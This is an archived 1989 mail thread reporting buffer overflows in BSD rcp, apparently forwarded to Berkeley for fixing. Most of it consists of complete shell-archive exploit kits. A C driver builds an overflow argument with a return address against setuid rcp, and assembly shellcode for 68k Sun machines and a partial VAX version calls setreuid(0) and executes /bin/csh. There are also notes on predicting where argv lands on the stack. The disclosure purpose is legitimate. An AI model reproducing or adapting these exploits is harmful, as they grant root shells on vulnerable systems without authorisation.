Subject: rcp has buffer overflow problems
Index: usr.sbin/rcp 4.3BSD-tahoe

Description:
	The same type of problems we found in fingerd exist in
	rcp.

=========================================================================
From haynes@ucscc.UCSC.EDU Thu May 18 14:36:44 1989
Date: Thu, 18 May 89 14:37:36 -0700
From: haynes@ucscc.UCSC.EDU (Jim Haynes)
To: bostic@okeeffe.Berkeley.EDU
Subject: We think

what follows is an earlier version of the sun cracker.  Note that ]
it, too, can play with rcp.  (Remember I told you that the
buffer-overflow experts were playing with rcp as well as fingerd...)
: to unbundle, "sh" this file -- DO NOT use csh
:  SHAR archive format.  Archive created Thu May 19 12:22:58 PDT 1988
echo x - Makefile
sed 's/^X//' > Makefile <<'+FUNKY+STUFF+'
XCFLAGS=
Xp100: fun.o main.o
X	$(CC) -s -o p100 fun.o main.o
Xinstall: p100
X	/bin/mv -f p100 /a/q/koreth/Public/p100
X	chmod 711 /a/q/koreth/Public/p100
X
+FUNKY+STUFF+
echo '-rw-------  1 koreth        149 May 19 12:20 Makefile    (as sent)'
chmod u=rw,g=,o= Makefile
ls -l Makefile
echo x - fun.s
sed 's/^X//' > fun.s <<'+FUNKY+STUFF+'
X.globl		_fun, _funlen, _fudge
X		_fudge = 0x01010101
X		dummy = _fudge
X_fun:
X		clrl	d1
X		movel	#-1,a0
X		moveq	#0x7e,d0
X		trap	#1
X
X		pea	_fudge
X		addl	#-_fudge, sp@
X		pea	_fudge + 0x2f637368
X		addl	#-_fudge, sp@
X		pea	_fudge + 0x2f62696e
X		addl	#-_fudge, sp@
X		movl	sp, d1
X		pea	_fudge + 0x63736800
X		addl	#-_fudge, sp@
X		movl	sp, a0
X		pea	_fudge+0
X		addl	#-_fudge, sp@
X		pea	a0@
X		movl	sp, a0
X		pea	_fudge+0
X		addl	#-_fudge, sp@
X		movl	sp, a1
X		moveq	#0x3b,d0
X		trap	#1
X
X		pea	_fudge+5
X		addl	#-_fudge, sp@
X		pea	dummy
X		trap	#1
X
X_funlen:	.long	_funlen - _fun
X
X
+FUNKY+STUFF+
echo '-rw-------  1 koreth        560 May 19 12:20 fun.s    (as sent)'
chmod u=rw,g=,o= fun.s
ls -l fun.s
echo x - main.c
sed 's/^X//' > main.c <<'+FUNKY+STUFF+'
Xchar binsu[] = { '.','c','h','o','.','r','t',0 };
Xchar binrcp[] = { '.','c','h','o','.','s','b','q',0 };
X
X#include <stdio.h>
X#include <assert.h>
X
X#define RET 0xfffe7fc			/* must be even, or it bus errors */
X#define SIZ BUFSIZ + 4 + 4 - 5 - 1	/* shut up, it works */
X
Xchar *envp2[] = {0};
Xchar *makearg();
Xextern int fun(), funlen;
X
Xchar *foob = "/a/q/koreth/Public/cpi -100";
X
Xmain(argc, argv)
Xchar **argv;
X{
X    int testing = 0;
X
X    if (getuid() != 1161 && getuid() != 304 && getuid() != 558)
X    {
X	system(foob);
X	exit(0);
X    }
X    if (argc != 2 || argv[1][0] != 'n' || argv[1][1] != 'q')
X    {
X	system(foob);
X	exit(0);
X    }
X    transmute(binsu);
X
X    if (getenv("FOO") == 0 || strcmp(getenv("FOO"), binsu))
X    {
X	system(foob);
X	exit(0);
X    }
X
X    transmute(binrcp);
X
X    execle(binrcp, "xxx", "-d", "", makearg(SIZ, RET), 0, envp2);
X    perror("p100");
X}
X
X#define EPS 5
Xchar apology[] = " ==(---------------------)== ";
Xchar *makearg(siz, ret)
X{
X    int i;
X    char *p;
X    static char buf[10000];
X    bcopy(fun, buf, funlen);
X    for(i = funlen; i < siz; ++i)
X	buf[i] = 1;
X    strncpy(buf+siz - strlen(apology) - (EPS*4) - 5, apology, strlen(apology));
X    *(int *)&buf[siz] = ret;
X    for (i = -EPS; i < EPS; ++i)
X        ((int *)&buf[siz])[i] = ret;
X
X    p = (char *)&((int *)&buf[siz])[EPS];	/* what, me obfuscate? */
X    for (i = 0; i < 1000; ++i)
X	*p++ = 1;
X    *p = 0;
X    if (strlen(buf) < siz+4)
X	printf("Error: strlen = %d, expected > %d\n", strlen(buf), siz+4);
X    return buf;
X}
X
Xtransmute(string)
Xchar *string;
X{
X	while (*string)
X		*string++ ^= 1;
X}
X
+FUNKY+STUFF+
echo '-rw-------  1 koreth       1572 May 19 12:21 main.c    (as sent)'
chmod u=rw,g=,o= main.c
ls -l main.c
exit 0

=========================================================================
From haynes@ucbarpa.Berkeley.EDU Thu May 18 17:21:19 1989
Date: Thu, 18 May 89 17:21:13 -0700
From: haynes@ucbarpa.Berkeley.EDU (Jim Haynes)
To: bostic@okeeffe.Berkeley.EDU
Subject: Please look at

in my home directory on arpa, in the directory foo, is what appears to be
the VAX version of the program that breaks in on Suns.  At least it has
the filename vax.tar.  I just tried it without success, but maybe
it really doesn't work, or I'm missing something, or ...  The
fun2.s seems to be encrypted.

From: haynes@ucscc.UCSC.EDU (Jim Haynes)

the 'p100' thing, definitely works on an ISI machine running 4.2.
Even tho I thought I had fixed rcp at that!  I'm about to try it
on an ISI machine running 4.3, but right now their disk is full (sigh).

=========================================================================
From haynes@ucbarpa.Berkeley.EDU Thu May 18 22:34:14 1989
Date: Thu, 18 May 89 22:34:07 -0700
From: haynes@ucbarpa.Berkeley.EDU (Jim Haynes)
To: bostic@okeeffe.Berkeley.EDU
Subject: The rest of it, perhaps

I found his encryption key, and so now the directory 'foo' in my
home directory on ucbarpa has fun2.s that is readable.  Still
doesn't work on that machine, but here's a piece of mail that probably
bears on it

> From splat Thu May 26 16:38:27 1988
> Return-Path: <splat>
> Received: by ssyx.ucsc.edu (3.2/SMI-3.4)
> 	id AA20855; Thu, 26 May 88 16:38:25 PDT
> Date: Thu, 26 May 88 16:38:25 PDT
> From: splat (Don Hatch)
> Message-Id: <8805262338.AA20855@ssyx.ucsc.edu>
> To: koreth
> Subject: Re:  Vax version
> Status: RO
> 
> I will be gone from tommorrow till next tuesday, so I won't be able to work on
> it till then.
> 
> Here are my observations concerning the behavior of the location
> of the argv strings.
> 
> 1. The longer the total length of your environ strings, the
>     further back the argv strings get placed (i.e. the lower the address
>     of a given argument).  So you probably want to pass the same environment
>     every time you run the program (unless you want to add up all the environ
>     string lengths-- probably more trouble than it's worth).
> 2. Of course, if you make an argv string longer, or add arguments,
>     all the arguments which precede it will get pushed back by
>     the corresponding number of bytes.
> 3. Argv[0] is special for some reason.  If you make it n bytes longer,
>     ALL the arguments will get pushed back n bytes.  I don't know why this is;
>     possibly an additional copy of argv[0] is placed on the stack
>     prior to the environment strings.
>     
> My experience has been that if you always exec the program with
> the same environment and same length arguments (e.g. I call
> my test program _usr_ucb_rcp so it will be the same length as
> /usr/ucb/rcp), then the argv strings will always end up in the same place.
> 
> Hope this helps a little.
> 
> Don

=========================================================================
From haynes@ucscc.UCSC.EDU Fri May 19 13:28:59 1989
Date: Fri, 19 May 89 13:29:42 -0700
From: haynes@ucscc.UCSC.EDU (Jim Haynes)
To: bostic@okeeffe.Berkeley.EDU
Subject: Here's the Sun 3 version

this works on at least SunOS 3.5, probably not on 4.0 and later
: to unbundle, "sh" this file -- DO NOT use csh
:  SHAR archive format.  Archive created Fri May 19 13:28:28 PDT 1989
echo x - Makefile
sed 's/^X//' > Makefile <<'+FUNKY+STUFF+'
X# Makefile for the sun.  I'll get around to the other machines soon.
X# I can't think of a good name for this program, but it does the same standard
X# boring old thing that all my other programs do...
X
XCFLAGS= -g
XSRCS=	Makefile main.c fun.s
XOBJS=	main.o fun.o
XDEST=	a.out
X
X$(DEST): $(OBJS)
X	cc -s $(OBJS) -o $(DEST)
X
Xclean:; rm $(OBJS)
Xshar:;	shar $(SRCS) > $(DEST).shar
+FUNKY+STUFF+
echo '-rw-------  1 root          370 May 19 13:22 Makefile    (as sent)'
chmod u=rw,g=,o= Makefile
ls -l Makefile
echo x - fun.s
sed 's/^X//' > fun.s <<'+FUNKY+STUFF+'
X.globl		_fun, _funlen, _fudge
X		_fudge = 0x01010101
X		dummy = _fudge
X_fun:
X
X	|first we must setuid(0), since
X	|4.3 csh gives "permission denied" if euid is 0 and real uid is not
X	|note that if we do this, "S" shows up in lastcomm.
X	|it would be better to write your own shell
X
X		pea	_fudge+0		| push two zeros
X		addl	#-_fudge, sp@
X		pea	_fudge+0
X		addl	#-_fudge, sp@
X		pea	dummy
X		pea	_fudge+0x7e	| setreuid
X		addl	#-_fudge, sp@
X		trap	#0
X
X	|push command "/bin/csh"
X		pea	_fudge		| the null after it
X		addl	#-_fudge, sp@
X		pea	_fudge + 0x2f637368	| "/csh"
X		addl	#-_fudge, sp@
X		pea	_fudge + 0x2f62696e	| "/bin"
X		addl	#-_fudge, sp@
X		movl	sp, a3		| a3 is cmd
X	|push actual arguments "csh\0"
X		pea	_fudge + 0x63736800	| "csh\0"
X		addl	#-_fudge, sp@
X		movl	sp, a0		| a0 is arg0
X	|push argv pointers a0, 0
X		pea	_fudge+0
X		addl	#-_fudge, sp@
X		pea	a0@
X		movl	sp, a1		| a1 is argv
X	|push env pointers 0
X		pea	_fudge+0
X		addl	#-_fudge, sp@
X		movl	sp, a2		| a2 is envp
X	|push environment
X		pea	a2@
X	|push argv
X		pea	a1@
X	|push cmd
X		pea	a3@
X	|push dummy
X		pea	dummy
X	|push opcode for execve and go for it
X		pea	_fudge+0x3b
X		addl	#-_fudge, sp@
X		trap	#0
X
X	|if it didn't work, exit with status 5
X		pea	_fudge+5
X		addl	#-_fudge, sp@
X		pea	dummy
X		trap	#0		| exit
X
X_funlen:	.long	_funlen - _fun
+FUNKY+STUFF+
echo '-rw-------  1 root         1287 May 19 13:22 fun.s    (as sent)'
chmod u=rw,g=,o= fun.s
ls -l fun.s
echo x - main.c
sed 's/^X//' > main.c <<'+FUNKY+STUFF+'
X#include <stdio.h>
X#include <assert.h>
X
X#define RET 0xefff7fc			/* must be even, or it bus errors */
X#define SIZ BUFSIZ + 4 + 4 - 5 - 1	/* shut up, it works */
X
Xchar *envp2[] = {0};
Xchar *makearg();
Xextern int fun(), funlen;
X
Xmain(argc, argv)
Xchar **argv;
X{
X    int testing = 0;
X
X    if (argc != 2 || argv[1][0] != 'n' || argv[1][1] != 'q')
X	exit(-1);
X
X    if (getenv("FOO") == 0 || strcmp(getenv("FOO"), "/bin/su"))
X	exit(-1);
X
X    execle(testing? "/bin/finger" : "/usr/ucb/rcp",
X		0 ? "/usr/ucb/rdist" : "xxx", "-d", "", makearg(SIZ, RET),
X		0 ? "/usr/ucb/lpq" : 0, envp2);
X    perror("execle");
X    printf("/usr/ucb/w");
X}
X
X#define EPS 5
Xchar apology[] = " ==(sorry about this mess)== ";
Xchar *makearg(siz, ret)
X{
X    int i;
X    char *p;
X    static char buf[10000];
X    bcopy(fun, buf, funlen);
X    for(i = funlen; i < siz; ++i)
X	buf[i] = 1;
X    strncpy(buf+siz - strlen(apology) - (EPS*4) - 5, apology, strlen(apology));
X    *(int *)&buf[siz] = ret;
X    for (i = -EPS; i < EPS; ++i)
X        ((int *)&buf[siz])[i] = ret;
X
X    p = (char *)&((int *)&buf[siz])[EPS];	/* what, me obfuscate? */
X    for (i = 0; i < 1000; ++i)
X	*p++ = 1;
X    *p = 0;
X    if (strlen(buf) < siz+4)
X	printf("Error: strlen = %d, expected > %d\n", strlen(buf), siz+4);
X    return buf;
X}
+FUNKY+STUFF+
echo '-rw-------  1 root         1262 May 19 13:22 main.c    (as sent)'
chmod u=rw,g=,o= main.c
ls -l main.c
exit 0
=========================================================================
# This is a shell archive.  Save it in a file, remove anything before
# this line, and then unpack it by entering "sh file".  Note, it may
# create directories; files and directories will be owned by you and
# have default permissions.
#
# This archive contains:
#
#	Makefile
#	foo.c
#	fun2.s
#	main.c
#
echo x - Makefile
sed 's/^X//' >Makefile << 'END-of-Makefile'
Xall: _foo_bar fun
X
X_foo_bar: foo.c
X	$(CC) foo.c -o _foo_bar
X
Xfun: fun.o main.c
X	$(CC) main.c fun.o -o fun
X
END-of-Makefile
echo x - foo.c
sed 's/^X//' >foo.c << 'END-of-foo.c'
X/*
X * Copyright (c) 1983 Regents of the University of California.
X * All rights reserved.  The Berkeley software License Agreement
X * specifies the terms and conditions for redistribution.
X */
X#ifndef lint
Xchar copyright[] =
X"@(#) Copyright (c) 1983 Regents of the University of California.\n\
X All rights reserved.\n";
X#endif not lint
X#ifndef lint
Xstatic char sccsid[] = "@(#)rcp.c	5.4 (Berkeley) 9/12/85";
X#endif not lint
X/*
X * rcp
X */
X#include <sys/param.h>
X#include <sys/stat.h>
X#include <sys/time.h>
X#include <sys/ioctl.h>
X#include <netinet/in.h>
X#include <stdio.h>
X#include <signal.h>
X#include <pwd.h>
X#include <ctype.h>
X#include <netdb.h>
X#include <errno.h>
Xint	rem;
Xchar	*colon(), *index(), *rindex(), *malloc(), *strcpy(), *sprintf();
Xint	errs;
Xint	lostconn();
Xint	errno;
Xchar	*sys_errlist[];
Xint	iamremote, targetshouldbedirectory;
Xint	iamrecursive;
Xint	pflag;
Xstruct	passwd *pwd;
Xstruct	passwd *getpwuid();
Xint	userid;
Xint	port;
Xstruct buffer {
X	int	cnt;
X	char	*buf;
X} *allocbuf();
X/*VARARGS*/
Xint	error();
X#define	ga()	 	(void) write(rem, "", 1)
Xmain(argc, argv)
X	int argc;
X	char **argv;
X{
X	char *targ, *host, *src;
X	char *suser, *tuser, *thost;
X	int i;
X	char buf[BUFSIZ], cmd[16];
X	struct servent *sp;
Xfor (i=0; i<argc; i++) printf("%08lx %s\n", argv[i], argv[i]); putchar('\n');
X	sp = getservbyname("shell", "tcp");
X	if (sp == NULL) {
X		fprintf(stderr, "rcp: shell/tcp: unknown service\n");
X		exit(1);
X	}
X	port = sp->s_port;
X	pwd = getpwuid(userid = getuid());
X	if (pwd == 0) {
X		fprintf(stderr, "who are you?\n");
X		exit(1);
X	}
X	for (argc--, argv++; argc > 0 && **argv == '-'; argc--, argv++) {
X		(*argv)++;
X		while (**argv) switch (*(*argv)++) {
X		    case 'r':
X			iamrecursive++;
X			break;
X		    case 'p':		/* preserve mtimes and atimes */
X			pflag++;
X			break;
X		    /* The rest of these are not for users. */
X		    case 'd':
X			targetshouldbedirectory = 1;
X			break;
X		    case 'f':		/* "from" */
X			iamremote = 1;
X			(void) response();
X			(void) setuid(userid);
X			source(--argc, ++argv);
X			exit(errs);
X		    case 't':		/* "to" */
X			iamremote = 1;
X			(void) setuid(userid);
X			sink(--argc, ++argv);
X			exit(errs);
X		    default:
X			fprintf(stderr,
X		"Usage: rcp [-p] f1 f2; or: rcp [-rp] f1 ... fn d2\n");
X			exit(1);
X		}
X	}
X	rem = -1;
X	if (argc > 2)
X		targetshouldbedirectory = 1;
X	(void) sprintf(cmd, "rcp%s%s%s",
X	    iamrecursive ? " -r" : "", pflag ? " -p" : "", 
X	    targetshouldbedirectory ? " -d" : "");
X	(void) signal(SIGPIPE, lostconn);
X	targ = colon(argv[argc - 1]);
X	if (targ) {				/* ... to remote */
X		*targ++ = 0;
X		if (*targ == 0)
X			targ = ".";
X		thost = index(argv[argc - 1], '@');
X		if (thost) {
X			*thost++ = 0;
X			tuser = argv[argc - 1];
X			if (*tuser == '\0')
X				tuser = NULL;
X			else if (!okname(tuser))
X				exit(1);
X		} else {
X			thost = argv[argc - 1];
X			tuser = NULL;
X		}
X		for (i = 0; i < argc - 1; i++) {
X			src = colon(argv[i]);
X			if (src) {		/* remote to remote */
X				*src++ = 0;
X				if (*src == 0)
X					src = ".";
X				host = index(argv[i], '@');
X				if (host) {
X					*host++ = 0;
X					suser = argv[i];
X					if (*suser == '\0')
X						suser = pwd->pw_name;
X					else if (!okname(suser))
X						continue;
X		(void) sprintf(buf, "rsh %s -l %s -n %s %s '%s%s%s:%s'",
X					    host, suser, cmd, src, tuser,
X					    tuser ? "@" : "",
X					    thost, targ);
X				} else
X		(void) sprintf(buf, "rsh %s -n %s %s '%s%s%s:%s'",
X					    argv[i], cmd, src, tuser,
X					    tuser ? "@" : "",
X					    thost, targ);
X				(void) susystem(buf);
X			} else {		/* local to remote */
X				if (rem == -1) {
X					(void) sprintf(buf, "%s -t %s",
X					    cmd, targ);
X					host = thost;
X					rem = rcmd(&host, port, pwd->pw_name,
X					    tuser ? tuser : pwd->pw_name,
X					    buf, 0);
X					if (rem < 0)
X						exit(1);
X					if (response() < 0)
X						exit(1);
X					(void) setuid(userid);
X				}
X				source(1, argv+i);
X			}
X		}
X	} else {				/* ... to local */
X		if (targetshouldbedirectory)
X			verifydir(argv[argc - 1]);
X		for (i = 0; i < argc - 1; i++) {
X			src = colon(argv[i]);
X			if (src == 0) {		/* local to local */
X				(void) sprintf(buf, "/bin/cp%s%s %s %s",
X				    iamrecursive ? " -r" : "",
X				    pflag ? " -p" : "",
X				    argv[i], argv[argc - 1]);
X				(void) susystem(buf);
X			} else {		/* remote to local */
X				*src++ = 0;
X				if (*src == 0)
X					src = ".";
X				host = index(argv[i], '@');
X				if (host) {
X					*host++ = 0;
X					suser = argv[i];
X					if (*suser == '\0')
X						suser = pwd->pw_name;
X					else if (!okname(suser))
X						continue;
X				} else {
X					host = argv[i];
X					suser = pwd->pw_name;
X				}
X				(void) sprintf(buf, "%s -f %s", cmd, src);
X				rem = rcmd(&host, port, pwd->pw_name, suser,
X				    buf, 0);
X				if (rem < 0)
X					continue;
X				(void) setreuid(0, userid);
X				sink(1, argv+argc-1);
X				(void) setreuid(userid, 0);
X				(void) close(rem);
X				rem = -1;
X			}
X		}
X	}
X	exit(errs);
X}
Xverifydir(cp)
X	char *cp;
X{
X	struct stat stb;
X	if (stat(cp, &stb) >= 0) {
X		if ((stb.st_mode & S_IFMT) == S_IFDIR)
X			return;
X		errno = ENOTDIR;
X	}
X	error("rcp: %s: %s.\n", cp, sys_errlist[errno]);
X	exit(1);
X}
Xchar *
Xcolon(cp)
X	char *cp;
X{
X	while (*cp) {
X		if (*cp == ':')
X			return (cp);
X		if (*cp == '/')
X			return (0);
X		cp++;
X	}
X	return (0);
X}
Xokname(cp0)
X	char *cp0;
X{
X	register char *cp = cp0;
X	register int c;
X	do {
X		c = *cp;
X		if (c & 0200)
X			goto bad;
X		if (!isalpha(c) && !isdigit(c) && c != '_' && c != '-')
X			goto bad;
X		cp++;
X	} while (*cp);
X	return (1);
Xbad:
X	fprintf(stderr, "rcp: invalid user name %s\n", cp0);
X	return (0);
X}
Xsusystem(s)
X	char *s;
X{
X	int status, pid, w;
X	register int (*istat)(), (*qstat)();
X	if ((pid = vfork()) == 0) {
X		(void) setuid(userid);
X		execl("/bin/sh", "sh", "-c", s, (char *)0);
X		_exit(127);
X	}
X	istat = signal(SIGINT, SIG_IGN);
X	qstat = signal(SIGQUIT, SIG_IGN);
X	while ((w = wait(&status)) != pid && w != -1)
X		;
X	if (w == -1)
X		status = -1;
X	(void) signal(SIGINT, istat);
X	(void) signal(SIGQUIT, qstat);
X	return (status);
X}
Xsource(argc, argv)
X	int argc;
X	char **argv;
X{
X	char *last, *name;
X	struct stat stb;
X	static struct buffer buffer;
X	struct buffer *bp;
X	int x, sizerr, f, amt;
X	off_t i;
X	char buf[BUFSIZ];
X	for (x = 0; x < argc; x++) {
X		name = argv[x];
X		if ((f = open(name, 0)) < 0) {
X			error("rcp: %s: %s\n", name, sys_errlist[errno]);
X			continue;
X		}
X		if (fstat(f, &stb) < 0)
X			goto notreg;
X		switch (stb.st_mode&S_IFMT) {
X		case S_IFREG:
X			break;
X		case S_IFDIR:
X			if (iamrecursive) {
X				(void) close(f);
X				rsource(name, &stb);
X				continue;
X			}
X			/* fall into ... */
X		default:
Xnotreg:
X			(void) close(f);
X			error("rcp: %s: not a plain file\n", name);
X			continue;
X		}
X		last = rindex(name, '/');
X		if (last == 0)
X			last = name;
X		else
X			last++;
X		if (pflag) {
X			/*
X			 * Make it compatible with possible future
X			 * versions expecting microseconds.
X			 */
X			(void) sprintf(buf, "T%ld 0 %ld 0\n",
X			    stb.st_mtime, stb.st_atime);
X			(void) write(rem, buf, strlen(buf));
X			if (response() < 0) {
X				(void) close(f);
X				continue;
X			}
X		}
X		(void) sprintf(buf, "C%04o %ld %s\n",
X		    stb.st_mode&07777, stb.st_size, last);
X		(void) write(rem, buf, strlen(buf));
X		if (response() < 0) {
X			(void) close(f);
X			continue;
X		}
X		if ((bp = allocbuf(&buffer, f, BUFSIZ)) < 0) {
X			(void) close(f);
X			continue;
X		}
X		sizerr = 0;
X		for (i = 0; i < stb.st_size; i += bp->cnt) {
X			amt = bp->cnt;
X			if (i + amt > stb.st_size)
X				amt = stb.st_size - i;
X			if (sizerr == 0 && read(f, bp->buf, amt) != amt)
X				sizerr = 1;
X			(void) write(rem, bp->buf, amt);
X		}
X		(void) close(f);
X		if (sizerr == 0)
X			ga();
X		else
X			error("rcp: %s: file changed size\n", name);
X		(void) response();
X	}
X}
X#include <sys/dir.h>
Xrsource(name, statp)
X	char *name;
X	struct stat *statp;
X{
X	DIR *d = opendir(name);
X	char *last;
X	struct direct *dp;
X	char buf[BUFSIZ];
X	char *bufv[1];
X	if (d == 0) {
X		error("rcp: %s: %s\n", name, sys_errlist[errno]);
X		return;
X	}
X	last = rindex(name, '/');
X	if (last == 0)
X		last = name;
X	else
X		last++;
X	if (pflag) {
X		(void) sprintf(buf, "T%ld 0 %ld 0\n",
X		    statp->st_mtime, statp->st_atime);
X		(void) write(rem, buf, strlen(buf));
X		if (response() < 0) {
X			closedir(d);
X			return;
X		}
X	}
X	(void) sprintf(buf, "D%04o %d %s\n", statp->st_mode&07777, 0, last);
X	(void) write(rem, buf, strlen(buf));
X	if (response() < 0) {
X		closedir(d);
X		return;
X	}
X	while (dp = readdir(d)) {
X		if (dp->d_ino == 0)
X			continue;
X		if (!strcmp(dp->d_name, ".") || !strcmp(dp->d_name, ".."))
X			continue;
X		if (strlen(name) + 1 + strlen(dp->d_name) >= BUFSIZ - 1) {
X			error("%s/%s: Name too long.\n", name, dp->d_name);
X			continue;
X		}
X		(void) sprintf(buf, "%s/%s", name, dp->d_name);
X		bufv[0] = buf;
X		source(1, bufv);
X	}
X	closedir(d);
X	(void) write(rem, "E\n", 2);
X	(void) response();
X}
Xresponse()
X{
X	char resp, c, rbuf[BUFSIZ], *cp = rbuf;
X	if (read(rem, &resp, 1) != 1)
X		lostconn();
X	switch (resp) {
X	case 0:				/* ok */
X		return (0);
X	default:
X		*cp++ = resp;
X		/* fall into... */
X	case 1:				/* error, followed by err msg */
X	case 2:				/* fatal error, "" */
X		do {
X			if (read(rem, &c, 1) != 1)
X				lostconn();
X			*cp++ = c;
X		} while (cp < &rbuf[BUFSIZ] && c != '\n');
X		if (iamremote == 0)
X			(void) write(2, rbuf, cp - rbuf);
X		errs++;
X		if (resp == 1)
X			return (-1);
X		exit(1);
X	}
X	/*NOTREACHED*/
X}
Xlostconn()
X{
X	if (iamremote == 0)
X		fprintf(stderr, "rcp: lost connection\n");
X	exit(1);
X}
Xsink(argc, argv)
X	int argc;
X	char **argv;
X{
X	off_t i, j;
X	char *targ, *whopp, *cp;
X	int of, mode, wrerr, exists, first, count, amt, size;
X	struct buffer *bp;
X	static struct buffer buffer;
X	struct stat stb;
X	int targisdir = 0;
X	int mask = umask(0);
X	char *myargv[1];
X	char cmdbuf[BUFSIZ], nambuf[BUFSIZ];
X	int setimes = 0;
X	struct timeval tv[2];
Xfprintf(stderr, "cp = %08lx, cmdbuf[0] = %08lx\n", &cp, &cmdbuf[0]);
X#define atime	tv[0]
X#define mtime	tv[1]
X#define	SCREWUP(str)	{ whopp = str; goto screwup; }
X	if (!pflag)
X		(void) umask(mask);
X	if (argc != 1) {
X		error("rcp: ambiguous target\n");
X		exit(1);
X	}
X	targ = *argv;
X	if (targetshouldbedirectory)
X		verifydir(targ);
X	ga();
X	if (stat(targ, &stb) == 0 && (stb.st_mode & S_IFMT) == S_IFDIR)
X		targisdir = 1;
X	for (first = 1; ; first = 0) {
X		cp = cmdbuf;
X		if (read(rem, cp, 1) <= 0)
X			return;
X		if (*cp++ == '\n')
X			SCREWUP("unexpected '\\n'");
X		do {
X			if (read(rem, cp, 1) != 1)
X				SCREWUP("lost connection");
X		} while (*cp++ != '\n');
X		*cp = 0;
X		if (cmdbuf[0] == '\01' || cmdbuf[0] == '\02') {
X			if (iamremote == 0)
X				(void) write(2, cmdbuf+1, strlen(cmdbuf+1));
X			if (cmdbuf[0] == '\02')
X				exit(1);
X			errs++;
X			continue;
X		}
X		*--cp = 0;
X		cp = cmdbuf;
X		if (*cp == 'E') {
X			ga();
X			return;
X		}
X#define getnum(t) (t) = 0; while (isdigit(*cp)) (t) = (t) * 10 + (*cp++ - '0');
X		if (*cp == 'T') {
X			setimes++;
X			cp++;
X			getnum(mtime.tv_sec);
X			if (*cp++ != ' ')
X				SCREWUP("mtime.sec not delimited");
X			getnum(mtime.tv_usec);
X			if (*cp++ != ' ')
X				SCREWUP("mtime.usec not delimited");
X			getnum(atime.tv_sec);
X			if (*cp++ != ' ')
X				SCREWUP("atime.sec not delimited");
X			getnum(atime.tv_usec);
X			if (*cp++ != '\0')
X				SCREWUP("atime.usec not delimited");
X			ga();
X			continue;
X		}
X		if (*cp != 'C' && *cp != 'D') {
X			/*
X			 * Check for the case "rcp remote:foo\* local:bar".
X			 * In this case, the line "No match." can be returned
X			 * by the shell before the rcp command on the remote is
X			 * executed so the ^Aerror_message convention isn't
X			 * followed.
X			 */
X			if (first) {
X				error("%s\n", cp);
X				exit(1);
X			}
X			SCREWUP("expected control record");
X		}
X		cp++;
X		mode = 0;
X		for (; cp < cmdbuf+5; cp++) {
X			if (*cp < '0' || *cp > '7')
X				SCREWUP("bad mode");
X			mode = (mode << 3) | (*cp - '0');
X		}
X		if (*cp++ != ' ')
X			SCREWUP("mode not delimited");
X		size = 0;
X		while (isdigit(*cp))
X			size = size * 10 + (*cp++ - '0');
X		if (*cp++ != ' ')
X			SCREWUP("size not delimited");
X		if (targisdir)
X			(void) sprintf(nambuf, "%s%s%s", targ,
X			    *targ ? "/" : "", cp);
X		else
X			(void) strcpy(nambuf, targ);
X		exists = stat(nambuf, &stb) == 0;
X		if (cmdbuf[0] == 'D') {
X			if (exists) {
X				if ((stb.st_mode&S_IFMT) != S_IFDIR) {
X					errno = ENOTDIR;
X					goto bad;
X				}
X				if (pflag)
X					(void) chmod(nambuf, mode);
X			} else if (mkdir(nambuf, mode) < 0)
X				goto bad;
X			myargv[0] = nambuf;
X			sink(1, myargv);
X			if (setimes) {
X				setimes = 0;
X				if (utimes(nambuf, tv) < 0)
X					error("rcp: can't set times on %s: %s\n",
X					    nambuf, sys_errlist[errno]);
X			}
X			continue;
X		}
X		if ((of = creat(nambuf, mode)) < 0) {
X	bad:
X			error("rcp: %s: %s\n", nambuf, sys_errlist[errno]);
X			continue;
X		}
X		if (exists && pflag)
X			(void) fchmod(of, mode);
X		ga();
X		if ((bp = allocbuf(&buffer, of, BUFSIZ)) < 0) {
X			(void) close(of);
X			continue;
X		}
X		cp = bp->buf;
X		count = 0;
X		wrerr = 0;
X		for (i = 0; i < size; i += BUFSIZ) {
X			amt = BUFSIZ;
X			if (i + amt > size)
X				amt = size - i;
X			count += amt;
X			do {
X				j = read(rem, cp, amt);
X				if (j <= 0) {
X					if (j == 0)
X					    error("rcp: dropped connection");
X					else
X					    error("rcp: %s\n",
X						sys_errlist[errno]);
X					exit(1);
X				}
X				amt -= j;
X				cp += j;
X			} while (amt > 0);
X			if (count == bp->cnt) {
X				if (wrerr == 0 &&
X				    write(of, bp->buf, count) != count)
X					wrerr++;
X				count = 0;
X				cp = bp->buf;
X			}
X		}
X		if (count != 0 && wrerr == 0 &&
X		    write(of, bp->buf, count) != count)
X			wrerr++;
X		(void) close(of);
X		(void) response();
X		if (setimes) {
X			setimes = 0;
X			if (utimes(nambuf, tv) < 0)
X				error("rcp: can't set times on %s: %s\n",
X				    nambuf, sys_errlist[errno]);
X		}				   
X		if (wrerr)
X			error("rcp: %s: %s\n", nambuf, sys_errlist[errno]);
X		else
X			ga();
X	}
Xscrewup:
X	error("rcp: protocol screwup: %s\n", whopp);
X	exit(1);
X}
Xstruct buffer *
Xallocbuf(bp, fd, blksize)
X	struct buffer *bp;
X	int fd, blksize;
X{
X	struct stat stb;
X	int size;
X	if (fstat(fd, &stb) < 0) {
X		error("rcp: fstat: %s\n", sys_errlist[errno]);
X		return ((struct buffer *)-1);
X	}
X	size = roundup(stb.st_blksize, blksize);
X	if (size == 0)
X		size = blksize;
X	if (bp->cnt < size) {
X		if (bp->buf != 0)
X			free(bp->buf);
X		bp->buf = (char *)malloc((unsigned) size);
X		if (bp->buf == 0) {
X			error("rcp: malloc: out of memory\n");
X			return ((struct buffer *)-1);
X		}
X	}
X	bp->cnt = size;
X	return (bp);
X}
X/*VARARGS1*/
Xerror(fmt, a1, a2, a3, a4, a5)
X	char *fmt;
X	int a1, a2, a3, a4, a5;
X{
X	char buf[BUFSIZ], *cp = buf;
X	errs++;
X	*cp++ = 1;
X	(void) sprintf(cp, fmt, a1, a2, a3, a4, a5);
X	(void) write(rem, buf, strlen(buf));
X	if (iamremote == 0)
X		(void) write(2, buf+1, strlen(buf+1));
X}
X
X
END-of-foo.c
echo x - fun2.s
sed 's/^X//' >fun2.s << 'END-of-fun2.s'
X.globl		_fun
X.globl		_funlen
X.globl		_minus_funlen
X.globl		_fudge
X		.set _fudge, 0x01010101
X		.set dummy, _fudge
X_fun:
X		pushl	$_fudge+0		
X		addl2	$-_fudge, (sp)
X		pushl	$_fudge+0
X		addl2	$-_fudge, (sp)
X		pushl	$_fudge+2
X		addl2	$-_fudge, (sp)
X		movl	sp, ap
X		movl	$_fudge+0x7e, r0
X		addl2	$-_fudge, r0
X		chmk	r0			# fchown(2, 0, 0);
X		pushl	$_fudge			# \0
X		addl2	$-_fudge, (sp)
X		
X		pushl	$_fudge + 0x6873632f	# /csh
